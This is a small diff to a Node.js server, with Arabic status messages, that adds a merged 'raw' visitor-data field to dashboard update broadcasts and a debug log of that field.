@@ -890,9 +890,15 @@ async function startServer() {
         customer: customerName,
         ...currentVisitor,
         ...updateData,
-        updated: `تم تحديث ${field}`
+        updated: `تم تحديث ${field}`,
+        // Explicitly include the raw data with updated status
+        raw: {
+          ...(currentVisitor?.raw || currentVisitor || {}),
+          ...updateData,
+        }
       });
 
+      console.log("[reflect-status] dashboardData.raw:", dashboardData.raw);
       broadcastToDashboard("dashboard:update", dashboardData);
 
       res.json({ success: true, field, status, visitorId, timestamp: now });
@@ -1740,7 +1746,12 @@ async function startServer() {
         ...currentVisitor,
         // Override with new update data
         ...updateData, 
-        updated: `تم التوجيه إلى: ${targetPage}` 
+        updated: `تم التوجيه إلى: ${targetPage}`,
+        // Explicitly include the raw data with updated status
+        raw: {
+          ...(currentVisitor?.raw || currentVisitor || {}),
+          ...updateData,
+        }
       });
 
       broadcastToDashboard("dashboard:update", dashboardData);
